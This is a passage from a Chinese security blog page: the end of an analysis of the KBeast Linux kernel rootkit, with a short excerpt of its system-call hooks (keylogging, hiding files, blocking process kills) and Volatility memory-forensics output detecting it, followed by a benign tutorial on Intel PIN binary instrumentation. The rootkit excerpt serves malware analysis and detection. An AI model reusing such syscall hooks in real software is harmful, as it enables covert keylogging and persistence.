+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sys_call_table[__NR_read]=h4x_read; <span class="comment">// log key</span></div><div class="line">sys_call_table[__NR_write]=h4x_write; <span class="comment">// fake output ps,pstree,top,lsof</span></div><div class="line">sys_call_table [__NR_getdents]=h4x_getdents; <span class="comment">//hide file and directory</span></div><div class="line">sys_call_table [__NR_unlink] = h4x_unlink; <span class="comment">//Don't allow your file to be removed</span></div><div class="line">sys_call_table [__NR_rmdir] = h4x_rmdir; <span class="comment">//Don't allow your directory to be removed</span></div><div class="line">sys_call_table [__NR_unlinkat] = h4x_unlinkat; <span class="comment">//Don't allow your file and directory to be removed </span></div><div class="line">sys_call_table [__NR_rename] = h4x_rename; <span class="comment">//Don't allow your file to be renamed/moved</span></div><div class="line">sys_call_table [__NR_open] = h4x_open; <span class="comment">//Don't allow your file to be overwrited</span></div><div class="line">sys_call_table [__NR_kill] = h4x_kill; <span class="comment">//Don't allow your process to be killed</span></div><div class="line">sys_call_table [__NR_delete_module] = h4x_delete_module;</div></pre></td></tr></table></figure>
+<h3 id="0X06-Libvmi-and-Volatility检测KBeast"><a href="#0X06-Libvmi-and-Volatility检测KBeast" class="headerlink" title="0X06 Libvmi and Volatility检测KBeast"></a>0X06 Libvmi and Volatility检测KBeast</h3><p>检测之前，先按照 <a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">这篇</a> 文章搭好环境。</p>
+<p>以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_check_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd</div><div class="line">  </div><div class="line">Pid    Uid    Gid    Arguments </div><div class="line"><span class="number">2316</span>   <span class="number">2</span>      <span class="number">2</span>      ./_h4x_bd</div><div class="line"></div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd </div><div class="line"> </div><div class="line"> Offset     Name                 Pid             Uid             Gid    DTB      Start Time</div><div class="line"> <span class="number">0xf579e680</span> _h4x_bd              <span class="number">2316</span>            <span class="number">2</span>               <span class="number">2</span>      <span class="number">0x357c5000</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-01</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">29</span> UTC+<span class="number">0000</span></div><div class="line">  </div><div class="line">  </div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd </div><div class="line"></div><div class="line"> Name                 Pid             Uid </div><div class="line"> ._h4x_bd             <span class="number">2316</span>            <span class="number">2</span> </div><div class="line">  </div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd </div><div class="line">  </div><div class="line">  Offset             Name                           Pid      FD       Path</div><div class="line">  <span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">1</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">2</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">3</span> socket:[<span class="number">11708</span>]</div><div class="line"></div><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd </div><div class="line">  </div><div class="line">  </div><div class="line"> linux_proc_maps</div><div class="line"> </div><div class="line"> </div><div class="line"> Offset             Pid      Name                 Start              End         </div><div class="line">       Flags       Pgoff Major  Minor  Inode      File Path</div><div class="line"></div><div class="line"> </div><div class="line"> </div><div class="line"> </div><div class="line"> <span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd                  <span class="number">0x0000000000adb000</span> <span class="number">0x0000000000adc000</span> ---      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adc000</span> <span class="number">0x0000000000ade000</span> r--      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000ade000</span> <span class="number">0x0000000000adf000</span> rw-      <span class="number">0x155000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adf000</span> <span class="number">0x0000000000ae2000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008048000</span> <span class="number">0x0000000008049000</span> r-x           <span class="number">0x0</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008049000</span> <span class="number">0x000000000804a000</span> r--        <span class="number">0x1000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x000000000804a000</span> <span class="number">0x000000000804b000</span> rw-        <span class="number">0x2000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7875000</span> <span class="number">0x00000000b7876000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7884000</span> <span class="number">0x00000000b7886000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000bfd84000</span> <span class="number">0x00000000bfd99000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> [stack]</div><div class="line"></div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   </div><div class="line">   </div><div class="line"> Module Address Module Name             </div><div class="line"> <span class="number">0xf805dae0</span> ipsecs_kbeast_v1</div></pre></td></tr></table></figure>
+<p> 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Checking <span class="keyword">for</span> make : /usr/bin/make</div><div class="line">Removing Kernel Module</div><div class="line">Removing Compiled Kernel Module</div><div class="line">Stoping Network Daemon</div><div class="line">Removing Backdoor File</div><div class="line">rm: cannot remove `./_h4x_bd': Permission denied</div><div class="line">Removing Installation Directory</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko':         Permission denied</div><div class="line">rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod': Permission     denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c':         Permission denied</div><div class="line">rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd': Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1':     Permission denied</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html" target="_blank" rel="external">http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html</a></p>
+<p><a href="http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf" target="_blank" rel="external">http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf</a></p>
+<p><a href="https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/" target="_blank" rel="external">https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/</a> </p>
+<p><a href="http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/" target="_blank" rel="external">http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/</a></p>
+<p><a href="http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html" target="_blank" rel="external">http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-pinintro" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/20170104/pinintro/">二进制代码注入PIN</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/20170104/pinintro/" class="article-date">
+  <time datetime="2017-01-04T06:16:14.000Z" itemprop="datePublished">2017-01-04</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/二进制分析/">二进制分析</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2015/12/19/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">个人博客</a>，讲述如何利用PIN进行二进制代码注入，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<hr>
+<blockquote>
+<ul>
+<li>什么是注入（Instrumentation)</li>
+<li>PIN初探</li>
+<li>PIN框架</li>
+<li>Pintools Example</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="什么是注入（Instrumentation"><a href="#什么是注入（Instrumentation" class="headerlink" title="什么是注入（Instrumentation)"></a>什么是注入（Instrumentation)</h2><p>每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。</p>
+<p>进一步说明，注入一般又分为静态二进制注入（Static Binary Instrumentation) 与动态二进制注入 （Dynamic Binary Instrumentation). 看定义可知，SBI技术工作在程序运行前，DBI则工作在运行过程中。相比SBI，DBI技术有以下优势：</p>
+<ul>
+<li>不需要重新编译、重新链接</li>
+<li>在运行时发现代码</li>
+<li>能处理动态产生的代码</li>
+<li>能附加到正在运行时的进程中</li>
+</ul>
+<p>目前，研究较多的都属DBI技术，前文提到，DBI的工作方式有点类似编译器，只不过分析例程（analysis routine)是可编程化的。DBI技术广泛应用在程序分析中，如逆向工程（reverse engineering), 程序调试（program debug)， 恶意代码分析（malware analysis)等。</p>
+<h2 id="Pin初探"><a href="#Pin初探" class="headerlink" title="Pin初探"></a>Pin初探</h2><p>对DBI技术有个大致了解之后，进入本文主题,  Pin是Intel 与University of Colorado合作研究出的一款用来动态分析二进制程序的注入工具，发表在系统顶会PLDI’2005,有兴趣的可以读读这篇文章，其它DBI技术还有Valgrind, DYNAMORIO, QEMU.</p>
+<p>开门见山，首先来看一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">    counter++;</div><div class="line">             sub  $0xff, %edx</div><div class="line">    counter++;</div><div class="line">             cmp  %esi, %edx</div><div class="line">    counter++;</div><div class="line">             jle &lt;L1&gt;</div><div class="line">    counter++;</div><div class="line">             mov  $0x1, %edi</div><div class="line">    counter++;</div><div class="line">             add  $0x10, %eax</div><div class="line">```             </div><div class="line"></div><div class="line">这段代码很简单，只是在每条指令前加了一个计数器</div><div class="line">那么如果使用PIN, 该如何实现？ 看下面代码：</div><div class="line"></div><div class="line">``` C</div><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &quot;pin.h&quot;</div><div class="line"></div><div class="line">UINT64 icount = 0;</div><div class="line"></div><div class="line">void docount() &#123; icount++; &#125;</div><div class="line">    </div><div class="line">void Instruction(INS ins, void *v) </div><div class="line">&#123;</div><div class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Fini(INT32 code, void *v) </div><div class="line">&#123; std::cerr &lt;&lt; &quot;Count &quot; &lt;&lt; icount &lt;&lt; endl; &#125;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    PIN_Init(argc, argv);</div><div class="line">    INS_AddInstrumentFunction(Instruction, 0);</div><div class="line">    PIN_AddFiniFunction(Fini, 0);</div><div class="line">    PIN_StartProgram();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>现在对这段实现代码一一解释：<br><code>void docount() {icount+;}</code> 用户可自定义<code>docount()</code> 函数，PIN称之为分析例程 （Analysis routine),先对这个概念保持一点印象。再看void Instruction（）函数，PIN 称之为注入例程（Instrumentation routine), 关注其中两个参数，<code>IPOINT_BEFORE</code> 表示在每条指令之前执行，<code>（AFUNPTR)docount</code>便是要注入的分析例程。<code>main()</code> 函数调用<code>INS_AddInstrumentFunction（Instruction,0)</code>,便会触发注入例程以及分析例程，这些参数都可以根据自己需求修改。<br>只需这么几行简单的代码，PIN便能帮你分析正在运行的二进制文件执行过的指令条数了。这么简单？ PIN只能做这些吗？ 当然不是！ 下文再介绍一些PIN的框架以及使用过程。</p>
+<p>##PIN框架<br>可以把PIN理解为实时编译器（just in time complier).只不过输入进PIN的不是二进制代码，而是可执行的二进制文件，PIN能拦截可执行文件的第一条指令，然后从这条指令开始产生新的代码序列，之后将控制权交给产生的代码序列，此刻用户就有机会注入自己的代码，这个过程就是Instrumentation.<br>如果你只想使用PIN来分析自己的二进制代码，内部实现原理 (可阅读PLDI’2005)大可不必关心，关注的应该是PIN为用户提供的上层接口，使用这个接口来编写自己的Pintools. 版权原因，本文也不会深入去介绍PIN是如何实现的。</p>
+<p>下面就来聊聊这个Pintools. Pintools实际上就是用户要实现的Instrumentation过程，可以把Pintools想象成能修改内部PIN的代码产生过程的插件（Plugins),PIN官网会提供一些sample教你怎么写Pintools,大部分还得靠用户自己去写。<br>总的来说，instrumentation包括两个部分：</p>
+<ul>
+<li>第一，决定在哪注入代码，注入什么代码的一种机制</li>
+<li>第二，在注入点要执行的代码</li>
+</ul>
+<p>第一个部分被称之为 <strong>instrumentation routine</strong>,第二个部分被称之为 <strong>analysis routine</strong>. Pintools会向PIN注册一个注入回调函数，如上文提到的<code>INS_AddInstrumentFunction（）</code>，该函数会代表instrumentation routine观察要产生的代码，分析代码的静态属性，来决定是否以及在哪里调用analysis routine. Analysis routine再收集被分析程序的数据。</p>
+<p>注意，前文中的例子对每条指令分析，带来的开销太大，因此，PIN提供不同的粒度对程序进行分析，供用户根据不同需求选择：</p>
+<ul>
+<li>Instruction</li>
+<li>Basic block: 包含一些指令序列，终止于控制流改变指令;单入口单出口。</li>
+<li>Trace:包含一些Basic block序列，终止于无条件控制流改变指令；单入口多出口。 </li>
+</ul>
+<p>##Pintools example<br>最后，以一个Pintools 的完整例子结束本文</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></div><div class="line"></div><div class="line">ofstream OutFile;</div><div class="line"></div><div class="line"><span class="comment">// The running count of instructions is kept here</span></div><div class="line"><span class="comment">// make it static to help the compiler optimize docount</span></div><div class="line"><span class="keyword">static</span> UINT64 icount = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// This function is called before every instruction is      executed</span></div><div class="line"><span class="function">VOID <span class="title">docount</span><span class="params">()</span> </span>&#123; icount++; &#125;</div><div class="line"></div><div class="line"><span class="comment">// Pin calls this function every time a new instruction     is encountered</span></div><div class="line"><span class="function">VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID *v)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">// Insert a call to docount before every            instruction, no arguments are passed</span></div><div class="line">  INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">KNOB&lt;<span class="built_in">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class="string">"pintool"</span>,</div><div class="line"><span class="string">"o"</span>, <span class="string">"inscount.out"</span>, <span class="string">"specify output file name"</span>);</div><div class="line"></div><div class="line"><span class="comment">// This function is called when the application exits</span></div><div class="line"><span class="function">VOID <span class="title">Fini</span><span class="params">(INT32 code, VOID *v)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed     by the application</span></div><div class="line">  OutFile.setf(ios::showbase);</div><div class="line">  OutFile &lt;&lt; <span class="string">"Count "</span> &lt;&lt; icount &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">  OutFile.close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Print Help Message                                                        */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool counts the number of dynamic          instructions executed"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt;      <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Main                                                                      */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/*   argc, argv are the entire command line: pin -t      &lt;toolname&gt; -- ...    */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">   <span class="comment">// Initialize pin</span></div><div class="line">   <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</div><div class="line"></div><div class="line">   OutFile.open(KnobOutputFile.Value().c_str());</div><div class="line"></div><div class="line">  <span class="comment">// Register Instruction to be called to instrument      instructions</span></div><div class="line">    INS_AddInstrumentFunction(Instruction, <span class="number">0</span>);</div><div class="line"></div><div class="line">   <span class="comment">// Register Fini to be called when the application      exits</span></div><div class="line">    PIN_AddFiniFunction(Fini, <span class="number">0</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Start the program, never returns</span></div><div class="line">    PIN_StartProgram();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.cs.virginia.edu/kim/docs/pldi05.pdf" target="_blank" rel="external">PLDI’2005</a></p>
+<p><a href="https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/" target="_blank" rel="external">PIN User Manual</a></p>
+<p><a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool" target="_blank" rel="external">PIN Intel Tutorials</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Instrumentation/">Instrumentation</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PIN/">PIN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <nav id="page-nav">
+        <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+      </nav>
+    </section>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Diting0x&nbsp;
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>
+    </div>
+  </div>
+</footer>
+    
+
+<script src="/js/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
